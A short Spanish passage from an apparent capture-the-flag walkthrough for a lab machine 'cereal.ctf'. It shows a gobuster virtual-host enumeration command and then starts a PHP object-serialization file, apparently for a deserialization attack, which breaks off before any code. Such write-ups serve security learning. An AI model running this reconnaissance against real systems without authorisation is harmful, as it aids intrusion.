...
Ataque de enumeracion de subdominios 

```bash
gobuster vhost -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://cereal.ctf -t 200 2>/dev/null
```

![](../../../attachments/Pasted%20image%2020260125211803.png)

Serializamos un objeto php 
```php
#File serialize.php
<?php
